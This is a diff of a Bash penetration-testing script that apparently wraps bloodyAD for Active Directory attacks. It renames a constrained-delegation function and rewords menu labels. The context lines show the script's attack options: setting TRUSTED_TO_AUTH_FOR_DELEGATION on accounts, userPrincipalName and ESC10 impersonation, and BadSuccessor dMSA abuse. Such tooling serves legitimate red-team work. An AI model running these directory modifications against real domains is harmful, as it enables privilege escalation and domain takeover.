@@ -4990,7 +4990,7 @@ add_upn_esc10() {
     echo -e ""
 }
 
-enable_protocoltransition_constrained() {
+enable_constrained_prototrans() {
     if ! stat "${bloodyad}" >/dev/null 2>&1; then
         echo -e "${RED}[-] Please verify the installation of bloodyad${NC}"
     else
@@ -4999,7 +4999,7 @@ enable_protocoltransition_constrained() {
             echo -e "${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}"
         else
             if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
-            echo -e "${BLUE}[*] Enabling protocol transition (for Constrained Delegation) on owned account. Please specify target:${NC}"
+            echo -e "${BLUE}[*] Adding Constrained Delegation with protocol transition on owned account. Please specify target:${NC}"
             echo -e "${CYAN}[*] Example: DC01 or FILE01 ${NC}"
             target_consdeleg=""
             read -rp ">> " target_consdeleg </dev/tty
@@ -5007,7 +5007,7 @@ enable_protocoltransition_constrained() {
                 echo -e "${RED}Invalid name.${NC} Please specify target:"
                 read -rp ">> " target_consdeleg </dev/tty
             done
-            echo -e "${CYAN}[*] Enabling protocol transition (for Constrained Delegation) on ${target_consdeleg}${NC}"
+            echo -e "${CYAN}[*] Adding Constrained Delegation with protocol transition on ${target_consdeleg}${NC}"
             run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} add uac '${target_consdeleg}$' -f TRUSTED_TO_AUTH_FOR_DELEGATION" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_consdeleg_${dc_domain}.txt"
         fi
     fi
@@ -7742,8 +7742,8 @@ modif_menu() {
         check_tool_status "${bloodyad}" "Add CIFS and HTTP SPNs entries to computer with Unconstrained Deleg rights - ServicePrincipalName & msDS-AdditionalDnsHostName (Requires: Owner of computer)" "26"
         check_tool_status "${bloodyad}" "Add userPrincipalName to perform Kerberos impersonation of another user (Targeting Linux machines) (Requires: GenericWrite on user)" "27"
         check_tool_status "${bloodyad}" "Modify userPrincipalName to perform Certificate impersonation (ESC10) (Requires: GenericWrite on user)" "28"
-        check_tool_status "${bloodyad}" "Enable protocol transition (required for Constrained Delegation) - uac: TRUSTED_TO_AUTH_FOR_DELEGATION (Requires: SeEnableDelegationPrivilege)" "29"
-        check_tool_status "${bloodyad}" "Add Constrained Deleg rights to Computer (Add HOST and LDAP SPN entries of DC) - msDS-AllowedToDelegateTo (Requires: Owner of computer)" "30"
+        check_tool_status "${bloodyad}" "Add Constrained Delegation rights with protocol transition - uac: TRUSTED_TO_AUTH_FOR_DELEGATION (Requires: SeEnableDelegationPrivilege)" "29"
+        check_tool_status "${bloodyad}" "Add HOST and LDAP SPN entries of DC (for Constrained Delegation) - msDS-AllowedToDelegateTo (Requires: Owner of computer)" "30"
         check_tool_status "${bloodyad}" "Add dMSA to exploit BadSuccessor on Windows Server 2025 (Requires: GenericWrite on OU)" "31"
         check_tool_status "${bloodyad}" "Remove dMSA to clean after exploiting BadSuccessor (Requires: GenericWrite on OU)" "32"
         check_tool_status "${bloodyad}" "Modify custom attribute using bloodyad (Requires: GenericWrite)" "33"
@@ -7874,7 +7874,7 @@ modif_menu() {
             ;;
 
         29)
-            enable_protocoltransition_constrained
+            enable_constrained_prototrans
             ;;
 
         30)
